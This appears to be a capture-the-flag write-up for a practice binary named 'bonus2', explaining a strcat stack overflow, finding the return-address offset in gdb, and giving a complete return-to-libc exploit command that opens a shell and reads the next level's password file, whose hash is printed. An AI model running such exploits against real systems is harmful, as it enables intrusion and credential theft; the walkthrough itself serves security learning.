@@ -1,0 +1,54 @@
+When I disassemble the binary I see many things:
+
+-The program expects at least 2 arguments
+-There is a buffer on the stack of 72 elements
+-There a getenv() on an environment variable 'LANG'
+
+The buffer is initialized with 0 using memset()
+Then the 40 first characters of the first argument are copied into the buffer
+Then the 32 first characters of the second argument are copied at the 40th character of the buffer
+
+There is a global variable 'language' that is set to 0 by default, if LANG=fi language = 1, if LANG=nl language = 2.
+
+Then a function 'greetuser()' is called with buffer as argument.
+
+In this function theres a buffer of 64 characters, then depending on the value of language, the buffer is filled with either:
+
+-"Hello "
+-"Goedemiddag! "
+-"Hyvää päivää "
+
+Then there is a call to strcat() with the first buffer and the second and after that a call to puts with the second buffer as argument.
+
+The strcat() call seems vulnerable, lets try to write on EIP with it:
+
+(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT
+
+
+After that EIP = 0x47474746 = "FGGG" so EIP offset = 23
+and EBP = 0x46464645 = "GHHH" so EBP offset = 19
+
+As we see that EIP has a value contained in argv[2] we know now that we can overwrite EIP with argv[2].
+
+Lets do a "Return to libc" exploitation.
+
+Find the libc system address using gdb:
+
+(gdb) print &system
+$1 = (<text variable, no debug info> *) 0xb7e6b060 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xb7f8cc58
+
+So our system address is: 0xb7e6b060
+"/bin/sh" address is: 0xb7f8cc58
+
+
+Lets do it:
+
+$ export LANG=nl
+$ ./bonus2 $(python -c 'print "AAAA" + "\x58\xcc\xf8\xb7" + "A" * 42') $(python -c 'print "A" * 23 + "\x60\xb0\xe6\xb7"')
+Goedemiddag! AAAAX��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
